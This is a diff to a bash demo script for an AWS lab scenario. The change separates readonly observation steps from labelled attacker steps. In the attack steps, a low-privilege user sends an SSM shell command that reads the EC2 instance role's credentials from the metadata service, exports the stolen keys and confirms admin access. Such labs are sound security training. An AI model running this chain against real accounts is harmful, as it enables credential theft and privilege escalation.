@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -71,6 +73,15 @@ if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -81,6 +92,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo "Target Instance: $INSTANCE_ID"
 echo "Target Role: $EC2_ROLE_NAME"
@@ -89,17 +101,26 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -109,17 +130,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -127,8 +150,9 @@ else
 fi
 echo ""
 
-# Step 5: Discover target EC2 instance (optional but helpful)
+# [OBSERVATION] Step 5: Discover target EC2 instance
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
+use_readonly_creds
 echo "Listing EC2 instances with their attached IAM roles..."
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
@@ -137,18 +161,20 @@ INSTANCE_INFO=$(aws ec2 describe-instances \
     --output text 2>/dev/null || echo "")
 
 if [ -n "$INSTANCE_INFO" ]; then
+    show_cmd "ReadOnly" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text"
     echo "Instance ID: $(echo $INSTANCE_INFO | awk '{print $1}')"
     echo "State: $(echo $INSTANCE_INFO | awk '{print $2}')"
     echo "Instance Profile: $(echo $INSTANCE_INFO | awk '{print $3}')"
     echo -e "${GREEN}✓ Found target instance with privileged role${NC}"
 else
-    echo -e "${YELLOW}⚠ Could not describe instance (may not have ec2:DescribeInstances permission)${NC}"
+    echo -e "${YELLOW}⚠ Could not describe instance${NC}"
     echo "Proceeding with instance ID from Terraform: $INSTANCE_ID"
 fi
 echo ""
 
-# Step 6: Check SSM agent status
+# [OBSERVATION] Step 6: Check SSM agent status
 echo -e "${YELLOW}Step 6: Checking if instance is ready for SSM commands${NC}"
+use_readonly_creds
 echo "Verifying SSM agent is running on the instance..."
 
 MAX_RETRIES=5
@@ -156,7 +182,7 @@ RETRY_COUNT=0
 SSM_READY=false
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
-    show_cmd "aws ssm describe-instance-information --region $AWS_REGION --filters \"Key=InstanceIds,Values=$INSTANCE_ID\" --query 'InstanceInformationList[0].PingStatus' --output text"
+    show_cmd "ReadOnly" "aws ssm describe-instance-information --region $AWS_REGION --filters \"Key=InstanceIds,Values=$INSTANCE_ID\" --query 'InstanceInformationList[0].PingStatus' --output text"
     SSM_STATUS=$(aws ssm describe-instance-information \
         --region $AWS_REGION \
         --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
@@ -183,12 +209,14 @@ if [ "$SSM_READY" = false ]; then
 fi
 echo ""
 
-# Step 7: Send SSM command to extract instance role credentials
+# [EXPLOIT] Step 7: Send SSM command to extract instance role credentials
 echo -e "${YELLOW}Step 7: Sending SSM command to extract instance role credentials${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the privilege escalation vector..."
 echo "Executing command to retrieve credentials from instance metadata service"
 
-show_attack_cmd "aws ssm send-command --region $AWS_REGION --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"TOKEN=\$(curl -X PUT \\\"http://169.254.169.254/latest/api/token\\\" -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\" 2>/dev/null)\",\"curl -H \\\"X-aws-ec2-metadata-token: \$TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$EC2_ROLE_NAME 2>/dev/null\"]'"
+show_attack_cmd "Attacker" "aws ssm send-command --region $AWS_REGION --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"TOKEN=\$(curl -X PUT \\\"http://169.254.169.254/latest/api/token\\\" -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\" 2>/dev/null)\",\"curl -H \\\"X-aws-ec2-metadata-token: \$TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$EC2_ROLE_NAME 2>/dev/null\"]'"
 COMMAND_ID=$(aws ssm send-command \
     --region $AWS_REGION \
     --instance-ids "$INSTANCE_ID" \
@@ -205,11 +233,11 @@ fi
 echo "Command ID: $COMMAND_ID"
 echo -e "${GREEN}✓ SSM command sent successfully${NC}\n"
 
-# Step 8: Wait for command completion
+# [OBSERVATION] Step 8: Wait for command completion
 echo -e "${YELLOW}Step 8: Waiting for command to complete${NC}"
+use_readonly_creds
 echo "This may take 15-30 seconds..."
 
-# Wait 15 seconds for IAM propagation standard
 sleep 15
 
 # Check command status
@@ -218,6 +246,7 @@ WAIT_TIME=0
 COMMAND_COMPLETE=false
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
+    show_cmd "ReadOnly" "aws ssm list-commands --region $AWS_REGION --command-id \"$COMMAND_ID\" --query 'Commands[0].Status' --output text"
     COMMAND_STATUS=$(aws ssm list-commands \
         --region $AWS_REGION \
         --command-id "$COMMAND_ID" \
@@ -246,10 +275,12 @@ if [ "$COMMAND_COMPLETE" = false ]; then
 fi
 echo ""
 
-# Step 9: Retrieve command output containing credentials
+# [EXPLOIT] Step 9: Retrieve command output containing credentials
 echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 
-show_attack_cmd "aws ssm get-command-invocation --region $AWS_REGION --command-id \"$COMMAND_ID\" --instance-id \"$INSTANCE_ID\" --query 'StandardOutputContent' --output text"
+show_attack_cmd "Attacker" "aws ssm list-command-invocations --region $AWS_REGION --command-id \"$COMMAND_ID\" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
 CREDS_JSON=$(aws ssm list-command-invocations \
     --region $AWS_REGION \
     --command-id "$COMMAND_ID" \
@@ -265,7 +296,7 @@ fi
 echo "Retrieved credentials from instance metadata service"
 echo -e "${GREEN}✓ Successfully extracted instance role credentials${NC}\n"
 
-# Step 10: Parse and export extracted credentials
+# [EXPLOIT] Step 10: Parse and export extracted credentials
 echo -e "${YELLOW}Step 10: Parsing and configuring extracted credentials${NC}"
 
 EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
@@ -280,23 +311,23 @@ fi
 echo "Extracted Access Key ID: ${EXTRACTED_ACCESS_KEY:0:10}..."
 echo "Switching to extracted credentials..."
 
+# These are the dynamically stolen instance role credentials - not replaced by helper
 export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
 export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
 export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
-# Keep region consistent
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"
 
-# Step 11: Verify admin access
+# [EXPLOIT] Step 11: Verify admin access
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_attack_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
